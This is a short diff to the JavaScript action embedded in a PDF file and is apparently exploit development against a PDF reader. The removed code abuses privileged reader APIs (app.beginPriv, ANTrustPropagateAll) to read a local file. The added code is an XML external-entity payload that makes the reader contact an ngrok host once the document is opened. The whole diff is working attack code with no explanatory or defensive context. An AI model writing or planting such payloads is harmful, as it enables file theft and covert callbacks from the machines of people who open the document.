@@ -52,17 +52,10 @@ endobj
  /Type /Action
 /S /JavaScript
 /JS (
-function test(a)
-{
-app.beginPriv();
-var file = '/c/test.txt';
-var secret = util.stringFromStream(util.readFileIntoStream(file, false));
-app.alert(secret);
-app.endPriv();
-}
-obj={path: {match: test}, root: test};
-obj=ANTrustPropagateAll(obj);
-ANStartApproval(obj);
+var cXMLDoc = '<?xml version="1.0" encoding="ISO-8859-1"?><foo>muh</foo>'
+var cXMLDoc2 = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ENTITY aaaa SYSTEM "https://39dc-112-215-171-180.ngrok.io">]><ab>&aaaa;</ab>'
+xml = XMLData.parse(cXMLDoc,false);
+xml.loadXML(cXMLDoc2,false,true);
 )
 >>
 endobj
